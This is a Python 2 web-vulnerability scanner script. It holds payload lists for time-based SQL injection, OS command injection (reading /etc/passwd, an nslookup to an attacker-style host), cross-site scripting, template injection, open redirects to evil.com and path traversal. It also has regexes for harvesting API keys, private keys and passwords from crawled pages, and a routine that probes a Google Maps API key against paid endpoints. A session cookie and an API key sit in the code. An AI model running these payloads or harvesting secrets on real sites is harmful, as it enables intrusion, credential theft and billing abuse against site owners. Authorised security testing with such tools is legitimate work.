#!/usr/bin/python
# coding=utf-8

from __future__ import print_function
import os
import sys, random
from requests.packages.urllib3.exceptions import InsecureRequestWarning							     	
from platform import system
from urlparse import urlparse
import dns.resolver
import requests, re, codecs, time
from multiprocessing import Pool
from time import time as timer
from multiprocessing.dummy import *
requests.packages.urllib3.disable_warnings (InsecureRequestWarning)

#Here U cAN Edit Your Cookies For Scan LINK With Cookies for exemple copy links from burp suite and copy the cookies
#{"VALUE": "KEY"} -------> LIKE THIS :)
#Use cookies_convert.py script for convert cookie string to  dictionary below :)

cookies = {'session': 'jQSbRpOTivKugbPkWSJyYiT5ipp1xDjV'}


sql_time_based = ["'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z","sleep(20)%23","1%20or%20sleep(20)%23",'"%20or%20sleep(20)%23',"'%20or%20sleep(20)%23",'"%20or%20sleep(20)%3d"',"'%20or%20sleep(20)%3d'","1)+or+sleep(20)%23",'")+or+sleep(20)%3d"',"')+or+sleep(20)%3d'","1))+or+sleep(20)%23",'"))+or+sleep(20)%3d"',"'))+or+sleep(20)%3d'","%3bwaitfor+delay+'0%3a0%3a5'--",")%3bwaitfor+delay+'0%3a0%3a5'--","'%3bwaitfor+delay+'0%3a0%3a5'--","')%3bwaitfor+delay+'0%3a0%3a5'--","1+or+pg_sleep(20)--",'"+or+pg_sleep(20)--',"'+or+pg_sleep(20)--","1)+or+pg_sleep(20)--",'")+or+pg_sleep(20)--',"')+or+pg_sleep(20)--","1))+or+pg_sleep(20)--",'"))+or+pg_sleep(20)--',"'))+or+pg_sleep(20)--","'+AnD+SLEEP(20)+ANd+'1","'%26%26SLEEP(20)%26%26'1","%2b+SLEEP(20)+%2b+'"]

#Here U can edit paylaods with response value or regex
#{"payload": "response"}

OS_Command1 = {
	#{"payload": "response"}
	#"____________________secrect_payload": "_________response_keyword"
	'kil3r1dz;print(md5(kil3r1998))' : 'ae275345d8a7ce93fc37ead2ac7f58cf1',
	'print(md5(kil3r1998))' : 'ae275345d8a7ce93fc37ead2ac7f58cf1',
	';phpinfo();' : '<td class="e">System </td>',
	'kil3r1dz;phpinfo();' : '<td class="e">System </td>',
	'kil3r1dz;ifconfig;':'<UP,LOOPBACK,RUNNING>',
	"kil3r1dz;system('ifconfig')":'UP BROADCAST MULTICAST',
	'kil3r1dz%3Bifconfig%3B':'<UP,LOOPBACK,RUNNING>',
	'kil3r1dz%3Bcat%20%2Fetc%2Fpasswd%3B':'root:/bin/bash',
	'kil3r1dz;nslookup kgji2ohoyw.web-attacker.com':'Name:	kgji2ohoyw.web-attacker.com',
	'kil3r1dz%26ifconfig':'<UP,LOOPBACK,RUNNING>',
	'kil3r1dz%7Cifconfig':'<UP,LOOPBACK,RUNNING>',
	'kil3r1dz%7C%7Cifconfig':'<UP,LOOPBACK,RUNNING>',
	"kil3r1dz;system('ls -la')":'drwxr',
	'kil3r1dz|ls -la':'drwxrwxr-x '

}

xss_payload = {
	"PGltZyBvbmVycm9yPSJsb2NhdGlvbj0namF2YXNjcmlwdDpceDI1NUN1MDA2MWxlcnQoZG9jdW1lbnQuZG9tYWluKSciIHNyYz0ieCIgPg==":"""onerror="location='javascript:""",
	"'-alert(1)-'":"''-alert(1)-''",
	'"autofocus/onfocus=alert(1)//':'""autofocus/onfocus=alert(1)//',
	"\'-alert(1)//":"\\'-alert(1)//'",
	'''"onload='confirm("test XSS")''': '''"onload='confirm("test XSS")''',
	'kil3r1dz"><script>alert(1998)</script>':'<script>alert(1998)</script>',
	"""" onload='javascript:alert(1)'""" : """" onload='javascript:alert(1)'""",
	"%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E" : "<svg><a><animate attributeName=href values=javascript:alert(1) />",
	"%22%3E%3Csvg%3E%3Cdiscard%20onbegin=alert(1)%3E" : "<svg><discard onbegin=alert(1)>",
	'kil3r1dz"><svg><animatetransform%20onbegin=alert(1)>':"<svg><animatetransform onbegin=alert(1)>",
	'"onmouseover="alert(1)':'""onmouseover="alert(1)"',
	'random"></p><script>alert(1)</script><p>':'<script>alert(1)</script>',
	'</script><script>alert(2021)</script>' : '</script><script>alert(2021)</script>',
	'kil3r1dz"><svg onload=alert(1998)>' : '<svg onload=alert(1998)>',
	'kil3r1dz%22%3E%3Cscript%3Ealert%281815%29%3C%2Fscript%3E' : '<script>alert(1815)</script>',
	'#kil3r1dz%2522%253E%253Cscript%253Ealert%25281815%2529%253C%252Fscript%253E' : '<script>alert(1815)</script>',
	'javascript:alert(1337)' : 'href="javascript:alert(1337)"',
	'javascript:alert(1337)' : 'src="javascript:alert(1337)"',
	'kil3r1dz"><svg/onload=alert(1)>':'<svg/onload=alert(1)>',
	'kil3r1dz"><iframe src="javascript:alert(19985)">':'<iframe src="javascript:alert(19985)">',
	'kil3r1dz"><h1>iambitch</h1>':'<h1>iambitch</h1>'

}


ssti_payload = {
		'${123*456}':'56088',
		'<%=123*567%>':'69741',
		'{{123*678}}':'83394'
}

jsl = [
	    "http://evil.com/",
	    "http://evil.com",
	    "%5cevil.com",
	    "%2f%2fevil.com",
	    "evil.com/%2f%2e%2e",
	    "#http://evil.com",
	    "@evil.com"
	    #"http://evil.com&next=http://evil.com&redirect=http://evil.com&redir=http://evil.com&rurl=http://evil.com",
	    #"//evil.com&next=//evil.com&redirect=//evil.com&redir=//evil.com&rurl=//evil.com"
	]

lfi = [
		"/etc/passwd",
		"/etc/passwd%00",
		"/etc%2fpasswd",
		"php://filter/resource=/etc/passwd",
		"/etc%2fpasswd%00",
		"/etc%5cpasswd",
		"/etc%5cpasswd%00",
		"/etc%c0%afpasswd",
		"/etc%c0%afpasswd%00",
		"../etc/passwd",
		"../../etc/passwd",
		"../../../etc/passwd",
		"../../../../etc/passwd",
		"../../../../../etc/passwd",
		"../../../../../../etc/passwd",
		"../../../../../../../etc/passwd",
		"../../../../../../../../etc/passwd",
		"../../../../../../../../../etc/passwd",
		"../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../../../etc/passwd",
		"../../etc/passwd%00",
		"../../../etc/passwd%00",
		"../../../../etc/passwd%00",
		"../../../../../etc/passwd%00",
		"../../../../../../etc/passwd%00",
		"../../../../../../../etc/passwd%00",
		"../../../../../../../../etc/passwd%00",
		"../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../../../../../etc/passwd%00",
		"../../../../../../../../../../../../../../../../etc/passwd%00"
	]

regex = {

	    'googleMap_api'  : r'''=AIza[0-9A-Za-z-_]{35}|"AIza[0-9A-Za-z-_]{35}|/AIza[0-9A-Za-z-_]{35}|\sAIza[0-9A-Za-z-_]{35}|'AIza[0-9A-Za-z-_]{35}''',
	    'google_captcha' : r'''=6L[0-9A-Za-z-_]{38}|"6L[0-9A-Za-z-_]{38}|/6L[0-9A-Za-z-_]{38}|\s6L[0-9A-Za-z-_]{38}|'6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$''',
	    'google_oauth'   : r'''=ya29\.[0-9A-Za-z\-_]+|"ya29\.[0-9A-Za-z\-_]+|/ya29\.[0-9A-Za-z\-_]+|\sya29\.[0-9A-Za-z\-_]+|'ya29\.[0-9A-Za-z\-_]+''',
	    'amazon_aws_access_key_id' : r'AKIA[0-9A-Z]{16}',
	    'amazon_mws_auth_toke' : r'amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
	    'aamazon_aws_urla' : r's3\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\.s3.[a-zA-Z0-9_-]+\.amazonaws.com',
	    'facebook_access_token' : r'EAACEdEose0cBA[0-9A-Za-z]+',
	    'authorization_basic' : r'basic\s*[a-zA-Z0-9=:_\+\/-]+',
	    'authorization_bearer' : r'bearer\s*[a-zA-Z0-9_\-\.=:_\+\/]+',
	    'authorization_api' : r'api[key|\s*]+[a-zA-Z0-9_\-]+',
	    'mailgun_api_key' : r'key-[0-9a-zA-Z]{32}',
	    'TWILIO_AUTH_TOKEN' : r'''=[0-9a-za-z]{32}|"[0-9a-za-z]{32}|/[0-9a-za-z]{32}|\s[0-9a-za-z]{32}|'[0-9a-za-z]{32}''',
	    'twilio_api_key' : r'''=SK[0-9a-fA-F]{32}|"SK[0-9a-fA-F]{32}|/SK[0-9a-fA-F]{32}|\sSK[0-9a-fA-F]{32}|'SK[0-9a-fA-F]{32}''',
	    'twilio_account_sid' : r'''=AC[a-zA-Z0-9_\-]{35}|"AC[a-zA-Z0-9_\-]{35}|/AC[a-zA-Z0-9_\-]{35}|\sAC[a-zA-Z0-9_\-]{35}|'AC[a-zA-Z0-9_\-]{35}''',
	    'twilio_app_sid' : r'''=AP[a-zA-Z0-9_\-]{32}|"AP[a-zA-Z0-9_\-]{32}|/AP[a-zA-Z0-9_\-]{32}|\sAP[a-zA-Z0-9_\-]{32}|'AP[a-zA-Z0-9_\-]{32}''',
	    'paypal_braintree_access_token' : r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
	    'square_oauth_secret' : r'sq0csp-[ 0-9A-Za-z\-_]{43}|sq0[a-z]{3}-[0-9A-Za-z\-_]{22,43}',
	    'square_access_token' : r'sqOatp-[0-9A-Za-z\-_]{22}|EAAA[a-zA-Z0-9]{60}',
	    'stripe_standard_api' : r'sk_live_[0-9a-zA-Z]{24}', # <-------
	    'stripe_restricted_api' : r'rk_live_[0-9a-zA-Z]{24}',
	    'github_access_token' : r'[a-zA-Z0-9_-]*:[a-zA-Z0-9_\-]+@github\.com*',
	    'rsa_private_key' : r'-----BEGIN RSA PRIVATE KEY-----',
	    'ssh_dsa_private_key' : r'-----BEGIN DSA PRIVATE KEY-----',
	    'ssh_dc_private_key' : r'-----BEGIN EC PRIVATE KEY-----',
	    'pgp_private_block' : r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
	    'json_web_token' : r'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',
	    'firebase'  : r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
	    'firebase_db.json' : r'[a-zA-Z0-9_-]*\.firebaseio.com',
	    'slack_token' : r"\"api_token\":\"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\"",
	    'SSH_privKey' : r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)",
	    'Heroku API KEY' : r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
	    'possible_Creds' : r"(?i)(" \
	                    r"password\s*[`=:\"]+\s*[^\s]+|" \
	                    r"password is\s*[`=:\"]*\s*[^\s]+|" \
	                    r"pwd\s*[`=:\"]*\s*[^\s]+|" \
	                    r"passwd\s*[`=:\"]+\s*[^\s]+)",
    }

def web_crawler():
	url_list1 = []
	list_url2 = []
	list_url3 = []
	pars0 = {
				"href":r'href=[\'"]?([^\'" >]+)',
				"src":r'src=[\'"]?([^\'" >]+)'
		}

	black_list = ('.jpg', '.png', '.gif', ".wav",".jpeg", "ico", "svg")
	jsextension = ('.js', '.js?', ".json")
	url = raw_input("Entre Your Target With [HTTPS://] : ")
	try:
		check = requests.get(url).content
	except:
		print("nemi")
		pass
	pars = {
			"href":r'href=[\'"]?([^\'" >]+)',
			"src":r'src=[\'"]?([^\'" >]+)'
	}
	url1 = urlparse(url)
	url2 = url1.netloc
	print("\t\033[1;92m [+] Host : \033[1;93m" + url2)
	print("----------- Start Scrapping ---------------")
	for i in pars:
		i = i.rstrip()
		dadi = re.findall(pars[i], check)
		for dadi2 in dadi:
			dadi2 = dadi2.rstrip()
			if dadi2 not in list_url2:
				list_url2.append(dadi2)
				if dadi2.endswith(black_list):
					pass
				elif (dadi2.startswith('/') and ".js" in dadi2):
					url_list1.append("http://"+ str(url2)+ dadi2)
					print("\033[1;92mJS: http://"+ str(url2)+ dadi2)
					open('output/web_Crawled/js_link.txt', 'a').write("http://"+ str(url2)+ dadi2 + '\n')

					
				elif (dadi2.startswith('http') and ".js" in dadi2):
					url_list1.append(dadi2)
					print("\033[1;92mJS: "+ dadi2)
					open('output/web_Crawled/js_link.txt', 'a').write(dadi2 + '\n')
				elif (dadi2.startswith('/') and str(black_list) not in dadi2):
					url_list1.append("http://"+ str(url2)+ dadi2)
					print("\033[1;94mhttp://"+ str(url2)+ dadi2)
					open('output/web_Crawled/_link.txt', 'a').write("http://"+ str(url2)+ dadi2 + '\n')
					#pass
				elif dadi2.startswith('#'):
					pass
				else:
					pass
			else:
				pass
				#print("its Exist: " + dadi2)
	#print("---------------------------------")
	for izeb in url_list1:
		print("\033[1;92m##### We Scrap Url From This Urls ##### : \033[1;93m"+izeb)
		try:
			check22 = requests.get(izeb).content
			for i2 in pars:
				i2 = i2.rstrip()
				sex = re.findall(pars[i2], check22)
				for sex2 in sex:
					sex2 = sex2.rstrip()
					if sex2 not in list_url3:
						list_url3.append(sex2)
						if sex2.endswith(black_list):
							pass
						elif (sex2.startswith('/') and ".js" in sex2):
							list_url3.append("http://"+ str(url2)+ sex2)
							open('output/web_Crawled/js_link.txt', 'a').write("http://"+ str(url2)+ sex2 + '\n')
							print("\033[1;92mJS: http://"+ str(url2)+ sex2)

						elif (sex2.startswith('http') and ".js" in sex2):
							list_url3.append(sex2)
							open('output/web_Crawled/js_link.txt', 'a').write(sex2 + '\n')
							print("\033[1;92mJS: "+ sex2)

						elif (sex2.startswith('/') and str(black_list) not in sex2):
							list_url3.append("http://"+ str(url2)+ sex2)
							open('output/web_Crawled/_link.txt', 'a').write("http://"+ str(url2)+ sex2 + '\n')
							print("\033[1;94mhttp://"+ str(url2)+ sex2)

						elif sex2.startswith('#'):
							pass
						else:
							pass
					else:
						pass
		except:
			pass
	print("################### FINISHED You Have Best Day BB :) ###################")

xnober = []

def googlemap():
	vulnerable_apis = []
	#apikey = "AIzaSyC1a0zObeFwLX6lp3psqKSqeSvyTJl-2Xg"  ---> api for test :)

	apikey = raw_input("\n         \033[1;95m[\033[1;92m?\033[1;95m] \033[1;92mEnter Your API KEY: \033[1;96m")
	print('\n')
	if 'AIz' not in apikey:
		print("\033[1;91m[-] Entre Valid API KEY Like This : AIzaSyC1a0zObeFwLX6lp3psqKSqeSvyTJl-2Xg -_-")
		sys.exit()
	else:
		pass
	url = "https://www.googleapis.com/customsearch/v1?cx=017576662512468239146:omuauf_lfve&q=lectures&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("errors") < 0:
		print("\033[1;92mAPI key is \033[1;31;40m vulnerable \033[0m \033[1;92mfor Custom Search API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("customsearch 			|| $5 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Custom Search API.")

	url = "https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key="+apikey
	response = requests.get(url, verify=False)
	if response.status_code == 200:
		print("\033[1;94mAPI key is \033[1;31;40m vulnerable \033[0m \033[1;94mfor Staticmap API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Staticmap 			|| $2 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Staticmap API.")

	url = "https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key="+apikey
	response = requests.get(url, verify=False)
	if response.status_code == 200:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Streetview API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Streetview 			|| $7 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Streetview API.")

	url = "https://www.google.com/maps/embed/v1/place?q=Seattle&key="+apikey
	response = requests.get(url, verify=False)
	if response.status_code == 200:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Embed (Basic) API! Here is the PoC HTML code which can be used directly via browser:")
		print("<iframe width=\"600\" height=\"450\" frameborder=\"0\" style=\"border:0\" src=\""+url+"\" allowfullscreen></iframe>")
		vulnerable_apis.append("Embed (Basic)			|| Free")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Embed (Basic) API.")

	url = "https://www.google.com/maps/embed/v1/search?q=record+stores+in+Seattle&key="+apikey
	response = requests.get(url, verify=False)
	if response.status_code == 200:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Embed (Advanced) API! Here is the PoC HTML code which can be used directly via browser:")
		print("<iframe width=\"600\" height=\"450\" frameborder=\"0\" style=\"border:0\" src=\""+url+"\" allowfullscreen></iframe>")
		vulnerable_apis.append("Embed (Advanced)		|| Free")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Embed (Advanced) API.")

	url = "https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Directions API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Directions 			|| $5 per 1000 requests")
		vulnerable_apis.append("Directions (Advanced) 	|| $10 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Directions API.")

	url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;91;40m \033[1;92mvulnerable \033[0m\033[1;92m for Geocode API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Geocode 			|| $5 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Geocode API.")

	url = "https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m for Distance Matrix API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Distance Matrix 		|| $5 per 1000 elements")
		vulnerable_apis.append("Distance Matrix (Advanced) 	|| $10 per 1000 elements")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Distance Matrix API.")

	url = "https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m for Find Place From Text API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Find Place From Text 		|| $17 per 1000 elements")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Find Place From Text API.")

	url = "https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Autocomplete API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Autocomplete 			|| $2.83 per 1000 requests")
		vulnerable_apis.append("Autocomplete Per Session 	|| $17 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Autocomplete API.")

	url = "https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Elevation API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Elevation 			|| $5 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Elevation API.")

	url = "https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("errorMessage") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Timezone API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Timezone 			|| $5 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Timezone API.")

	url = "https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Nearest Roads API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Nearest Roads 		|| $10 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Nearest Roads API.")

	url = "https://www.googleapis.com/geolocation/v1/geolocate?key="+apikey
	postdata = {'considerIp': 'true'}
	response = requests.post(url, data=postdata, verify=False)
	if response.text.find("error") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0mfor Geolocation API! Here is the PoC curl command which can be used from terminal:")
		print("curl -i -s -k  -X $'POST' -H $'Host: www.googleapis.com' -H $'Content-Length: 22' --data-binary $'{\"considerIp\": \"true\"}' $'"+url+"'")
		vulnerable_apis.append("Geolocation 			|| $5 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Geolocation API.")

	url = "https://roads.googleapis.com/v1/snapToRoads?path=-35.27801,149.12958|-35.28032,149.12907&interpolate=true&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Route to Traveled API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Route to Traveled 		|| $10 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Route to Traveled API.")

	url = "https://roads.googleapis.com/v1/speedLimits?path=38.75807927603043,-9.03741754643809&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Speed Limit-Roads API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Speed Limit-Roads 		|| $20 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Speed Limit-Roads API.")

	url = "https://maps.googleapis.com/maps/api/place/details/json?place_id=ChIJN1t_tDeuEmsRUsoyG83frY4&fields=name,rating,formatted_phone_number&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Place Details API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Place Details 		|| $17 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Place Details API.")

	url = "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-33.8670522,151.1957362&radius=100&types=food&name=harbour&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Nearby Search-Places API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Nearby Search-Places		|| $32 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Nearby Search-Places API.")

	url = "https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Text Search-Places API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Text Search-Places 		|| $32 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Text Search-Places API.")

	url = "https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=CnRtAAAATLZNl354RwP_9UKbQ_5Psy40texXePv4oAlgP4qNEkdIrkyse7rPXYGd9D_Uj1rVsQdWT4oRz4QrYAJNpFX7rzqqMlZw2h2E2y5IKMUZ7ouD_SlcHxYq1yL4KbKUv3qtWgTK0A6QbGh87GB3sscrHRIQiG2RrmU_jF4tENr9wGS_YxoUSSDrYjWmrNfeEHSGSc3FyhNLlBU&key="+apikey
	response = requests.get(url, verify=False, allow_redirects=False)
	if response.status_code == 302:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Places Photo API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Places Photo 			|| $7 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Places Photo API.")

	url = "https://maps.googleapis.com/maps/api/place/queryautocomplete/json?input=pizza+near%20par&key="+apikey
	response = requests.get(url, verify=False)
	if response.text.find("error_message") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0m\033[1;92m Query Autocomplete-Places API! Here is the PoC link which can be used directly via browser:")
		print("\033[1;95m|__ \033[1;96m" + url)
		vulnerable_apis.append("Query Autocomplete-Places 	|| $2.83 per 1000 requests")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Text Search-Places API.")


	url = "https://playablelocations.googleapis.com/v3:samplePlayableLocations?key="+apikey
	postdata = {'area_filter':{'s2_cell_id':7715420662885515264},'criteria':[{'gameObjectType':1,'filter':{'maxLocationCount':4,'includedTypes':['food_and_drink']},'fields_to_return': {'paths': ['name']}},{'gameObjectType':2,'filter':{'maxLocationCount':4},'fields_to_return': {'paths': ['types', 'snapped_point']}}]}
	response = requests.post(url, data=postdata, verify=False)
	if response.text.find("error") < 0:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0mfor Playable Locations API! Here is the PoC curl command which can be used from terminal:")
		print("curl -i -s -k  -X $'POST' -H $'Host: playablelocations.googleapis.com' -H $'Content-Length: 302' --data-binary $'{\"area_filter\":{\"s2_cell_id\":7715420662885515264},\"criteria\":[{\"gameObjectType\":1,\"filter\":{\"maxLocationCount\":4,\"includedTypes\":[\"food_and_drink\"]},\"fields_to_return\": {\"paths\": [\"name\"]}},{\"gameObjectType\":2,\"filter\":{\"maxLocationCount\":4},\"fields_to_return\": {\"paths\": [\"types\", \"snapped_point\"]}}]}' $'"+url+"'")
		vulnerable_apis.append("Playable Locations 	|| $10 per 1000 daily active users")
	else:
		print("\033[1;91m[-] API key is not vulnerable for Playable Locations API.")

	url = "https://fcm.googleapis.com/fcm/send"
	postdata = "{'registration_ids':['ABC']}"
	response = requests.post(url, data=postdata, verify=False, headers={'Content-Type':'application/json','Authorization':'key='+apikey})
	if response.status_code == 200:
		print("\033[1;92m* API key is \033[1;31;40m vulnerable \033[0mfor FCM API! Here is the PoC curl command which can be used from terminal:")
		print("curl --header \"Authorization: key="+apikey+"\" --header Content-Type:\"application/json\" https://fcm.googleapis.com/fcm/send -d '{\"registration_ids\":[\"ABC\"]}'")
		vulnerable_apis.append("FCM Takeover 			|| https://abss.me/posts/fcm-takeover/")
	else:
		print("\033[1;91m[-] API key is not vulnerable for FCM API.")

	print("\033[1;94m-------------------------------------------------------------")
	print("  Results 			|| Cost Table/Reference to Exploit:")
	print("-------------------------------------------------------------")
	for i in range (len(vulnerable_apis)):
	    print("- " + vulnerable_apis[i])
	print("-------------------------------------------------------------")
	print("\033[1;92mReference for up-to-date pricing:")
	print("https://cloud.google.com/maps-platform/pricing")
	print("https://developers.google.com/maps/billing/gmp-billing")
	file  = 'Poc_Map.html'
	try:
		os.remove(file)
	except:
		pass
	f = open(file,"w+")
	f.write('<!DOCTYPE html><html><head><script src="https://maps.googleapis.com/maps/api/js?key='+apikey+'&callback=initMap&libraries=&v=weekly" defer></script><style type="text/css">#map{height:100%;}html,body{height:100%;margin:0;padding:0;}</style><script>let map;function initMap(){map=new google.maps.Map(document.getElementById("map"),{center:{lat:-34.397,lng:150.644},zoom:8,});}</script></head><body><div id="map"></div></body></html>')
	f.close()
